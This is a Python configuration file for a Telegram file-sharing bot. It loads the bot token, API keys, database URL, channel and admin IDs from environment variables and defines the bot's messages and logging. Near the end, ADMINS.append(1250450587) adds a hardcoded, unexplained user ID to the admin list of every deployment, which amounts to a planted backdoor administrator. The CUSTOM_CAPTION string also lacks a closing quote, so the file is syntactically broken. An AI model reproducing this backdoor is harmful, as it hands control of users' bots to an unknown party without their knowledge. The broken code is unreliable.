#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b>Heyy there {first},\n\nɪ'ᴍ ​🇰​​🇦​​🇸​​🇺​​🇲​​🇮​, ʏᴏᴜʀ ғʀɪᴇɴᴅʟʏ ʟɪɴᴋ ᴍᴀɴᴀɢᴇʀ ʙᴏᴛ.\nɪ'ᴍ ᴛʜᴇ ɢᴏ-ᴛᴏ ʙᴏᴛ ғᴏʀ ᴍᴀɴᴀɢɪɴɢ ᴀʟʟ ᴛʜᴇ ʟɪɴᴋs ɪɴ ᴛʜᴇ ᴜᴄʜɪʜᴀ ᴄᴏᴍᴍᴜɴɪᴛʏ.\n\nᴀɴᴅ ʏᴏᴜ ᴋɴᴏᴡ ᴡʜᴀᴛ's ᴄᴏᴏʟ? ɪ ᴡᴀs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴛʜᴇ ᴏɴᴇ ᴀɴᴅ ᴏɴʟʏ ᴛʜᴇ ʟᴀsᴛ ᴄᴏᴅᴇʀ!</b>")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "‌<b>(っ◔◡◔)っ ♥ 🇭‌🇪‌🇱‌🇱‌🇴 ♥‌ {first},\n\n‌🇾🇴‌🇺‌ 🇳‌🇪‌🇪‌🇩‌ 🇹‌🇴‌ 🇯‌🇴‌🇮‌🇳‌ 🇮‌🇳‌ 🇲‌🇾‌ 🇨‌🇭‌🇦‌🇳‌🇳‌🇪‌🇱‌/🇬‌🇷‌🇴‌🇺‌🇵‌ 🇹‌🇴‌ 🇺‌🇸‌🇪‌ 🇲‌🇪‌\n\n🇰‌🇮‌🇳‌🇩‌🇱‌🇾‌ 🇵‌🇱‌🇪‌🇦‌🇸‌🇪‌ 🇯‌🇴‌🇮‌🇳‌ 🇨‌🇭‌🇦‌🇳‌🇳‌🇪‌🇱‌</b>")

#Adding a Start Pic!!
START_PIC = os.environ.get("START_PIC", "https://telegra.ph/file/519147bfdcbc38b7d9e5b.jpg")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", "Your Link is Ready!\nHave Fun & Enjoy!)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
